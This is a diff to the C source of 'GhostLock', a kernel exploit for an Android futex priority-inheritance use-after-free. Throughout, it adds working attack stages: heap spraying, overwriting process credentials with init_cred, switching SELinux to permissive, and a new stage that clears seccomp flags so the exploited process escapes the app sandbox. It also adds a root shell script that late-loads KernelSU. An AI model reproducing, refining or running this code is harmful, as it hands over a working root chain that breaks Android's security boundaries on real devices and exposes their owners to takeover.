@@ -1,8 +1,8 @@
 /*
  * GhostLock — CVE-2026-43499 futex PI UAF exploit
  *
- * Phase 1: Write 1 — SELinux permissive (child-node PI write)
- * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
+ * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
+ * ksud late-load.
  */
 
 #include "common.h"
@@ -12,6 +12,7 @@
 #include <linux/perf_event.h>
 #include <sys/socket.h>
 #include <sys/utsname.h>
+#include <poll.h>
 
 const struct kernel_offsets *active_offsets = NULL;
 
@@ -251,13 +252,17 @@ int run_main_route_threads(void) {
          atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
 }
 
-static int do_one_write(uintptr_t target, const char *desc, int mode) {
-  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
-  pselect_child_node = 1;
+static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
+  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
+  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
+   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
+   * with the erased node's rb_right value: fake_left is always NULL so case 1
+   * always fires, and the erased node is RED so no color fixup runs. */
+  pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, 0, mode);
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
+  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
   TIMER("  heap spray done");
   int routed = run_main_route_threads();
   TIMER("  PI route done");
@@ -269,26 +274,61 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
 }
 
 static int check_selinux_off(void) {
-  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
-  if (efd < 0) return 1;
+  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+  if (efd < 0) {
+    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
+    return 0;
+  }
   char b[4] = {0};
   read(efd, b, sizeof(b));
   close(efd);
   return b[0] == '0';
 }
 
+static int enforce_readable(void) {
+  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+  if (efd < 0) return 0;
+  close(efd);
+  return 1;
+}
+
+static int process_has_seccomp(void) {
+  /* The app flow runs inside zygote, whose seccomp filter blocks
+   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
+   * fork() inherits that, so the W2 child does not need W3 there. */
+  FILE *status = fopen("/proc/self/status", "r");
+  if (!status) return 0;
+  char line[256];
+  int seccomp = 0;
+  while (fgets(line, sizeof(line), status)) {
+    if (strncmp(line, "Seccomp:", 8) == 0) {
+      seccomp = atoi(line + 8);
+      break;
+    }
+  }
+  fclose(status);
+  return seccomp != 0;
+}
+
 static void slab_drain(void) {
+  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
+   * (exit 137) especially right before heap spray. */
   struct timespec up;
   clock_gettime(CLOCK_BOOTTIME, &up);
-  int waves = (up.tv_sec > 60) ? 5 : 2;
-  int batch = (up.tv_sec > 60) ? 400 : 200;
+  int waves = (up.tv_sec > 60) ? 2 : 1;
+  int batch = (up.tv_sec > 60) ? 64 : 32;
   for (int wave = 0; wave < waves; wave++) {
-    pid_t *drain = calloc(batch, sizeof(pid_t));
+    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
+    if (!drain) return;
     int n = 0;
     for (int i = 0; i < batch; i++) {
-      drain[i] = fork();
-      if (drain[i] == 0) { pause(); _exit(0); }
-      if (drain[i] > 0) n++;
+      pid_t pid = fork();
+      if (pid == 0) {
+        pause();
+        _exit(0);
+      }
+      if (pid > 0) drain[n++] = pid;
+      else break;
     }
     for (int i = 0; i < n; i++) {
       kill(drain[i], SIGKILL);
@@ -296,41 +336,98 @@ static void slab_drain(void) {
     }
     free(drain);
     sched_yield();
+    usleep(20000);
   }
 }
 
+static char g_home_dir[256] = "/data/local/tmp";
+static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
+
+static void init_runtime_paths(void) {
+  const char *home = getenv("GHOSTLOCK_HOME");
+  if (!home || !home[0]) home = getenv("TMPDIR");
+  if (!home || !home[0]) home = "/data/local/tmp";
+
+  snprintf(g_home_dir, sizeof(g_home_dir), "%s", home);
+  size_t n = strlen(g_home_dir);
+  while (n > 1 && g_home_dir[n - 1] == '/') {
+    g_home_dir[--n] = '\0';
+  }
+  snprintf(g_root_script_path, sizeof(g_root_script_path),
+           "%s/.ghostlock_root.sh", g_home_dir);
+  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
+}
+
 static void write_root_script(void) {
-  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
-  if (sfd < 0) return;
-  const char *script =
-    "#!/system/bin/sh\n"
-    "KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
-    "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
-    "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
-    "if ! grep -q kernelsu /proc/modules 2>/dev/null && [ -x \"$KSUD\" ]; then\n"
-    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
-    "  KVER=$(uname -r | cut -d. -f1-2); AVER=$(uname -r | grep -o 'android[0-9]*'); KMI=\"${AVER}-${KVER}\"\n"
-    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell </dev/null >/dev/null 2>&1 &\n"
-    "fi\n"
-    "KSU_READY=0\n"
-    "for i in $(seq 1 30); do\n"
-    "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
-    "  sleep 0.1\n"
-    "done\n"
-    "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-    "  echo '[!] KernelSU module not loaded; SELinux policy/enforcing unchanged'\n"
-    "  exit 1\n"
-    "fi\n"
-    "if load_policy /sys/fs/selinux/policy 2>/dev/null; then\n"
-    "  echo '[*] SELinux policy reloaded'\n"
-    "else\n"
-    "  echo '[!] SELinux policy reload failed'\n"
-    "fi\n"
-    "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
-    "echo '[!] Reconnect Wi-Fi or mobile data if network is unavailable'\n"
-    "rm -f /data/local/tmp/.ghostlock_w1\n";
-  write(sfd, script, strlen(script));
+  char script[4096];
+  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+  if (sfd < 0) {
+    pr_warning("open root script failed path=%s errno=%d\n",
+               g_root_script_path, errno);
+    return;
+  }
+
+  int n = snprintf(
+      script, sizeof(script),
+      "#!/system/bin/sh\n"
+      "HOME_DIR='%s'\n"
+      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
+      "KSUD=\"$HOME_DIR/ksud\"\n"
+      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
+      "chmod 644 \"$LOG\" 2>/dev/null\n"
+      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
+      "if [ ! -x \"$KSUD\" ]; then\n"
+      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+      "fi\n"
+      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
+      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
+      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
+      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
+      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
+      "if [ ! -x \"$KSUD\" ]; then\n"
+      "  echo '[!] ksud missing' | tee -a \"$LOG\"\n"
+      "  exit 1\n"
+      "fi\n"
+      "chmod 755 \"$KSUD\" 2>/dev/null\n"
+      "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "  KVER=$(uname -r | cut -d. -f1-2)\n"
+      "  AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
+      "  KMI=\"${AVER}-${KVER}\"\n"
+      "  if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then KMI=android15-6.6; fi\n"
+      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
+      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+      "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+      "  dmesg | tail -20 >>\"$LOG\" 2>&1\n"
+      "fi\n"
+      "KSU_READY=0\n"
+      "for i in $(seq 1 50); do\n"
+      "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
+      "  sleep 0.1\n"
+      "done\n"
+      "if [ \"$KSU_READY\" -ne 1 ]; then\n"
+      "  echo '[!] KernelSU module not loaded; SELinux policy/enforcing unchanged' | tee -a \"$LOG\"\n"
+      "  exit 1\n"
+      "fi\n"
+      "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
+      "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "POLICY=/sys/fs/selinux/policy\n"
+      "for i in $(seq 1 50); do [ -s \"$POLICY\" ] && break; sleep 0.1; done\n"
+      "load_policy \"$POLICY\" >>\"$LOG\" 2>&1\n"
+      "RC=$?\n"
+      "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "echo \"[*] policy fixup rc=$RC\" >>\"$LOG\"\n"
+      "echo '[!] Reconnect Wi-Fi or mobile data if network is unavailable' | tee -a \"$LOG\"\n",
+      g_home_dir);
+  if (n < 0 || n >= (int)sizeof(script)) {
+    pr_warning("root script too long\n");
+    close(sfd);
+    return;
+  }
+  if (write(sfd, script, (size_t)n) != n) {
+    pr_warning("write root script failed errno=%d\n", errno);
+  }
   close(sfd);
+  chmod(g_root_script_path, 0755);
 }
 
 static int kernelsu_module_loaded(void) {
@@ -367,10 +464,17 @@ static uintptr_t perf_find_task(void) {
 
   errno = 0;
   int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
+  if (fd < 0) {
+    pr_warning("perf_event_open failed errno=%d\n", errno);
+    return 0;
+  }
   size_t msz = 4096 * (1 + 32);
   void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
+  if (buf == MAP_FAILED) {
+    pr_warning("perf mmap failed errno=%d\n", errno);
+    close(fd);
+    return 0;
+  }
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
   for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
@@ -415,6 +519,11 @@ struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
+  setpgid(0, 0);  /* own group so the parent can kill the whole late-load
+                   * tree (sh + ksud) on timeout */
+  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* ksud-spawned daemons must not
+                                          * inherit the report pipe */
+  prctl(PR_SET_NAME, "ghostleaf_0123456789");
   uintptr_t my_task = perf_find_task();
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
@@ -422,16 +531,100 @@ static void child_main(struct child_pipes *p) {
   char cmd;
   while (read(p->cmd_r, &cmd, 1) == 1) {
     if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
+    else if (cmd == 'F') {
+      /* Forked finit_module probe after W3b zeroed seccomp.mode: mode==2
+       * re-arms TIF_SECCOMP on fork (probe hits the filter); mode==0 lets it
+       * run filter-free to a normal errno. Forked so SIGSYS costs only this. */
+      uint32_t code = 0xffffffff;
+      int probe_pipe[2];
+      if (pipe(probe_pipe) == 0) {
+        pid_t probe = fork();
+        if (probe == 0) {
+          close(probe_pipe[0]);
+          errno = 0;
+          long r = syscall(__NR_finit_module, 0, 0, 0);
+          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
+          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
+          (void)nw;
+          _exit(0);
+        }
+        close(probe_pipe[1]);
+        int st = 0;
+        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
+          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
+          if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
+        } else {
+          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
+        }
+        close(probe_pipe[0]);
+      }
+      write(p->uid_w, &code, sizeof(code));
+    }
+    else if (cmd == 'D') {
+      /* Direct finit_module probe for W3a (a fork would re-inherit the filter
+       * while mode==2): TIF_SECCOMP clear -> normal errno, filter active ->
+       * this process is SIGSYS-killed. */
+      uint32_t code = 0xffffffff;
+      errno = 0;
+      long r = syscall(__NR_finit_module, 0, 0, 0);
+      code = (r == 0) ? 0 : (uint32_t)errno;
+      write(p->uid_w, &code, sizeof(code));
+    }
+    else if (cmd == 'M') {
+      /* Report comm length + first byte to tell which side a leaf=1 write
+       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
+       * [target+8] len 8, untouched len 15. */
+      char comm[24] = {0};
+      FILE *cf = fopen("/proc/self/comm", "r");
+      if (cf) {
+        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
+        (void)n;
+        fclose(cf);
+      }
+      size_t len = strlen(comm);
+      while (len > 0 && comm[len - 1] == '\n') {
+        comm[len - 1] = 0;
+        len--;
+      }
+      uint32_t report =
+        ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
+      write(p->uid_w, &report, sizeof(report));
+    }
     else if (cmd == 'G' || cmd == 'X') break;
   }
-  close(p->cmd_r); close(p->uid_w);
-  if (getuid() != 0) _exit(1);
+  close(p->cmd_r);
+  if (getuid() != 0) { close(p->uid_w); _exit(1); }
+  /* Keep the app-side pipe/exit fds out of the late-load worker chain: a
+   * lingering holder (ksud/zygisk daemons) would keep the app's read and
+   * waitFor blocked after this process exits. */
+  for (int fd = 3; fd < 1024; fd++) {
+    int fl = fcntl(fd, F_GETFD);
+    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
+  }
   pid_t worker = fork();
   if (worker == 0) {
-    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
+    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
     _exit(1);
   }
-  if (worker > 0) waitpid(worker, NULL, 0);
+  int wst = -1;
+  if (worker > 0) waitpid(worker, &wst, 0);
+  /* Report whether the script reached the loaded-module line: only this root
+   * child can read the root-owned log, and the parent loses /proc/modules
+   * once enforcing is restored. */
+  uint32_t report = 0;
+  char ksu_log_path[320];
+  snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
+  FILE *lf = fopen(ksu_log_path, "r");
+  if (lf) {
+    char line[256];
+    while (fgets(line, sizeof(line), lf)) {
+      if (strstr(line, "[+] KernelSU module loaded")) report = 1;
+    }
+    fclose(lf);
+  }
+  ssize_t nw = write(p->uid_w, &report, sizeof(report));
+  (void)nw;
+  close(p->uid_w);
   _exit(0);
 }
 
@@ -452,13 +645,20 @@ typedef int (*write_stage_verify_fn)(void *context);
 
 static int retry_write_stage(
     const char *stage, uintptr_t target, int mode, int attempts,
-    useconds_t settle_usec, write_stage_verify_fn verify, void *context) {
+    useconds_t settle_usec, write_stage_verify_fn verify, void *context,
+    int leaf) {
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
-    slab_drain();
-    do_one_write(target, stage, mode);
+    if (attempt == 1) slab_drain();
+    int routed = do_one_write(target, stage, mode, leaf);
+    if (!routed) {
+      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
+      usleep(100000);
+      continue;
+    }
     if (settle_usec) usleep(settle_usec);
     if (verify(context)) return 1;
+    usleep(50000);
   }
   return 0;
 }
@@ -472,6 +672,11 @@ static int verify_selinux_stage(void *context) {
 
 struct w2_stage_context {
   struct child_pipes *pipes;
+};
+
+struct w3_stage_context {
+  struct child_pipes *pipes;
+  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
 };
 
 static int verify_w2_stage(void *context) {
@@ -489,11 +694,86 @@ static int verify_w2_stage(void *context) {
   return 1;
 }
 
+static int verify_seccomp_probe_stage(void *context) {
+  struct w2_stage_context *stage = context;
+  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;
+
+  uint32_t code = 0;
+  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
+      (ssize_t)sizeof(code)) {
+    return 0;
+  }
+  pr_info("seccomp finit_module probe = 0x%x\n", code);
+  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
+   * With init_cred + permissive SELinux a real probe fails with a normal
+   * errno instead. */
+  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
+      code == 1 || code == 38) {
+    return 0;
+  }
+  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
+  return 1;
+}
+
+static int verify_w3a_direct_stage(void *context) {
+  struct w2_stage_context *stage = context;
+  if (write(stage->pipes->cmd_w, "D", 1) != 1) return 0;
+
+  uint32_t code = 0xffffffff;
+  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
+      (ssize_t)sizeof(code)) {
+    pr_warning("W3a direct probe: no reply (child likely SIGSYS-killed)\n");
+    return 0;
+  }
+  pr_info("W3a direct finit_module probe = 0x%x\n", code);
+  /* A normal errno means TIF_SECCOMP is clear. SIGSYS (0xfffffffd) means the
+   * filter still kills; EPERM/ENOSYS count as failure because zeroing mode
+   * with TIF_SECCOMP set would BUG(). */
+  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
+      code == 1 || code == 38) {
+    return 0;
+  }
+  pr_success("W3a direct probe: filter bypassed in child (errno=%u)\n", code);
+  return 1;
+}
+
+static int verify_leaf_dir_stage(void *context) {
+  struct w3_stage_context *stage = context;
+  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;
+
+  uint32_t report = 0;
+  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
+      (ssize_t)sizeof(report)) {
+    return 0;
+  }
+  size_t len = (report >> 8) & 0xff;
+  unsigned char c0 = (unsigned char)(report & 0xff);
+  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
+  if (len == 8) {
+    stage->leaf_to_target8 = 1;
+    pr_info("leaf=1 write lands on [target+8]\n");
+    return 1;
+  }
+  if (len == 0) {
+    stage->leaf_to_target8 = 0;
+    pr_info("leaf=1 write lands on [target]\n");
+    return 1;
+  }
+  if (len == 15) {
+    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
+    return 0;
+  }
+  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
+  return 0;
+}
+
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
   disable_rseq_for_thread();
   set_unbuffer();
+  signal(SIGPIPE, SIG_IGN);
   set_limit();
+  init_runtime_paths();
   write_root_script();
 
   if (!active_offsets && select_offsets() < 0) return 1;
@@ -510,26 +790,36 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
-  /* W1: disable SELinux before task discovery. */
+  /* W1: disable SELinux before task discovery. untrusted_app may not be able
+   * to read enforce while it is still enforcing, so attempt W1 regardless. */
   int selinux_ok = check_selinux_off();
   if (!selinux_ok) {
+    if (!enforce_readable()) {
+      pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
+    }
     TIMER("pre-W1 drain");
     selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 5, 100000,
-        verify_selinux_stage, NULL);
-    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
+        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
+        verify_selinux_stage, NULL, 0);
+    if (!selinux_ok) {
+      pr_warning("Write 1 failed\n");
+      return 1;
+    }
     TIMER("Write 1 complete");
   } else {
     pr_success("SELinux already permissive\n");
   }
 
-  /* W2: overwrite the child credential. */
+  /* W2: overwrite the child credential via the task leaked by perf. */
   slab_drain();
   TIMER("pre-W2 drain");
 
   struct child_pipes pipes;
   pid_t child = spawn_child(&pipes);
-  if (child < 0) { pr_error("fork failed\n"); return 1; }
+  if (child < 0) {
+    pr_warning("fork failed\n");
+    return 1;
+  }
 
   uintptr_t child_task = 0;
   read(pipes.task_r, &child_task, sizeof(child_task));
@@ -537,95 +827,189 @@ int run_exploit(int argc, char **argv) {
   TIMER("perf_find_task done");
 
   if (!child_task) {
-    /* perf failed (seccomp?) — retry once */
+    /* perf leaked nothing; respawn and retry once */
     pr_info("perf returned 0, retrying...\n");
     waitpid(child, NULL, 0);
     child = spawn_child(&pipes);
-    if (child < 0) { pr_error("retry fork failed\n"); return 1; }
+    if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
     read(pipes.task_r, &child_task, sizeof(child_task));
     close(pipes.task_r);
   }
 
   if (!child_task) {
-    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
+    pr_warning("Cannot find task_struct (perf leak failed)\n");
     close(pipes.cmd_w);
     waitpid(child, NULL, 0);
     return 1;
   }
 
   pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
-  pr_info("DEBUG: INIT_CRED=0x%016llx data_addr=0x%016llx\n",
-          (unsigned long long)INIT_CRED,
-          (unsigned long long)data_addr(INIT_CRED));
-  pr_info("DEBUG: cred_off=0x%x\n", TASK_CRED_OFF);
   pselect_child_node = 1;
 
   struct w2_stage_context w2_context = { .pipes = &pipes };
   int got_root = retry_write_stage(
       "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
-      verify_w2_stage, &w2_context);
+      verify_w2_stage, &w2_context, 0);
 
   if (!got_root) {
     write(pipes.cmd_w, "X", 1);
     close(pipes.cmd_w); close(pipes.uid_r);
-    pr_error("W2 failed after 10 rounds\n");
+    pr_warning("W2 failed after 10 rounds\n");
     waitpid(child, NULL, 0);
     return 1;
   }
 
+  /* W3: bypass the child's inherited app seccomp filter so the late-load
+   * script (forked sh) can run finit_module; adb/shell (Seccomp: 0) skips W3.
+   *
+   * fork() re-arms TIF_SECCOMP while seccomp.mode != 0, so mode must be
+   * zeroed too; zeroing mode with the flag still set BUG()s (earlier reboots),
+   * so a direct finit_module probe first proves the flags write: cleared ->
+   * normal errno, filter active -> SIGSYS.
+   *
+   * The leaf=1 write lands on [target] or [target+8]; a comm probe
+   * (task+TASK_COMM_OFF) learns which before picking the targets
+   * (thread_info.flags at task+0, seccomp.mode at task+TASK_SECCOMP_OFF). */
+  int seccomp_ok;
+  int child_alive = 1;
+  if (process_has_seccomp()) {
+    struct w3_stage_context w3_context = {
+      .pipes = &pipes,
+      .leaf_to_target8 = 1,
+    };
+    int dir_ok = retry_write_stage(
+        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 2, 50000,
+        verify_leaf_dir_stage, &w3_context, 1);
+    if (!dir_ok) {
+      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+    }
+
+    uintptr_t flags_target = w3_context.leaf_to_target8
+      ? child_task - 8
+      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
+
+    int w3a_ok = 0;
+    for (int attempt = 1; attempt <= 4; attempt++) {
+      pr_info("W3a: TIF_SECCOMP attempt %d/4\n", attempt);
+      if (attempt == 1) slab_drain();
+      int routed = do_one_write(flags_target, "W3a: TIF_SECCOMP", 1, 1);
+      if (!routed) {
+        pr_warning("W3a attempt %d route failed; backing off\n", attempt);
+        usleep(100000);
+        continue;
+      }
+      usleep(50000);
+      if (verify_w3a_direct_stage(&w2_context)) {
+        w3a_ok = 1;
+        break;
+      }
+      int st = 0;
+      if (waitpid(child, &st, WNOHANG) == child) {
+        pr_warning("W3a direct probe killed the child (status=0x%x); "
+                   "aborting W3 to avoid a mode=0 BUG panic\n", st);
+        child_alive = 0;
+        break;
+      }
+      usleep(50000);
+    }
+
+    if (!w3a_ok) {
+      pr_warning("W3 TIF_SECCOMP clear failed; ksud late-load will likely stay blocked\n");
+      seccomp_ok = 0;
+    } else {
+      pr_success("W3a: child TIF_SECCOMP cleared\n");
+      /* End-to-end check: a forked probe mirrors the late-load worker. Here
+       * clearing the thread flags suffices (probe passes with mode still 2);
+       * on stock kernels the fork re-arms TIF_SECCOMP, so we then zero
+       * seccomp.mode/count (W3b) and re-probe. */
+      seccomp_ok = verify_seccomp_probe_stage(&w2_context);
+      if (!seccomp_ok) {
+        uintptr_t mode_target = w3_context.leaf_to_target8
+          ? child_task + TASK_SECCOMP_OFF - 8
+          : child_task + TASK_SECCOMP_OFF;
+        /* On this vendor kernel TASK_SECCOMP_OFF points at the filter slot
+         * (mode/count 8 bytes earlier); the same write zeroes mode/count on a
+         * stock layout. Either way the fork probe verifies it. */
+        seccomp_ok = retry_write_stage(
+            "W3b: seccomp mode", mode_target, 1, 2, 50000,
+            verify_seccomp_probe_stage, &w2_context, 1);
+        if (!seccomp_ok)
+          pr_warning("W3b seccomp clear or final probe failed\n");
+      }
+      if (seccomp_ok)
+        pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
+    }
+  } else {
+    pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
+    seccomp_ok = 1;
+  }
+
   sleep(2);
   TIMER("exploit complete");
-  write(pipes.cmd_w, "G", 1);
-  close(pipes.cmd_w); close(pipes.uid_r);
-  waitpid(child, NULL, 0);
-  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
-  char enforce_state = '?';
-  if (enforce_fd >= 0) {
-    if (read(enforce_fd, &enforce_state, 1) != 1) enforce_state = '?';
-    close(enforce_fd);
+  if (child_alive) {
+    if (write(pipes.cmd_w, "G", 1) != 1)
+      pr_warning("failed to start late-load worker (child exited early)\n");
+  } else {
+    pr_warning("skipping late-load: child was SIGSYS-killed by the W3a probe\n");
   }
+  close(pipes.cmd_w);
+  uint32_t child_report = 0;
+  if (child_alive) {
+    /* Bound the late-load handoff: if the worker hangs (e.g. a kernel lock
+     * inside a script step), kill the whole tree so the app flow finishes. */
+    int waited_ms = 0;
+    for (;;) {
+      pid_t r = waitpid(child, NULL, WNOHANG);
+      if (r == child || r < 0) break;
+      if (waited_ms >= 45000) {
+        pr_warning("late-load worker timed out; killing child\n");
+        kill(-child, SIGKILL);
+        waitpid(child, NULL, 0);
+        break;
+      }
+      usleep(100000);
+      waited_ms += 100;
+    }
+    struct pollfd pfd = { .fd = pipes.uid_r, .events = POLLIN };
+    ssize_t nr = -1;
+    if (poll(&pfd, 1, 10000) > 0 && (pfd.revents & POLLIN)) {
+      nr = read(pipes.uid_r, &child_report, sizeof(child_report));
+    }
+    if (nr != (ssize_t)sizeof(child_report)) child_report = 0;
+  }
+  close(pipes.uid_r);
 
   int kernelsu_ready = 0;
   for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
     usleep(100000);
   }
-  if (kernelsu_ready && enforce_state == '1')
+  /* The poll can miss a module once enforcing is restored (untrusted_app
+   * loses /proc/modules); use the child's report, falling back to the log. */
+  int ksu_log_loaded = (child_report & 1u) != 0;
+  for (int i = 0; i < 30 && !ksu_log_loaded; i++) {
+    char ksu_log_path[320];
+    snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
+    FILE *lf = fopen(ksu_log_path, "r");
+    if (lf) {
+      char line[256];
+      while (fgets(line, sizeof(line), lf)) {
+        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
+      }
+      fclose(lf);
+    }
+    if (!ksu_log_loaded) usleep(200000);
+  }
+  kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+
+  /* ksud restores enforcing itself once the module is up, so a loaded module
+   * is the success signal. */
+  if (kernelsu_ready)
     pr_success("KernelSU ready; SELinux enforcing restored\n");
-  else if (kernelsu_ready && enforce_state == '0')
-    pr_warning("KernelSU ready; SELinux remains permissive\n");
+  else if (seccomp_ok)
+    pr_warning("temporary root ready; KernelSU module not loaded (ksud late-load failed; see .ghostlock_ksu.log)\n");
+  else
+    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
   return 0;
 }
 
-int install_embedded_wallpaper(void) { return 0; }
-
-static int run_write1_only(void) {
-  disable_rseq_for_thread();
-  set_unbuffer();
-  set_limit();
-  if (!active_offsets && select_offsets() < 0) return 1;
-  init_p0_profile();
-  init_ashmem_path();
-  pin_to_core(CORE);
-  kaslr_slide = 0;
-  kaslr_base = KIMAGE_TEXT_BASE;
-  kaslr_done = 1;
-
-  if (check_selinux_off()) {
-    pr_success("SELinux already permissive\n");
-    return 0;
-  }
-
-  if (retry_write_stage(
-          "Write 1", data_addr(SELINUX_ENFORCING), 1, 20, 100000,
-          verify_selinux_stage, NULL)) {
-    return 0;
-  }
-  pr_error("Write 1 failed after 20 attempts\n");
-  return 1;
-}
-
-int main(int argc, char **argv) {
-    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
-        return run_write1_only();
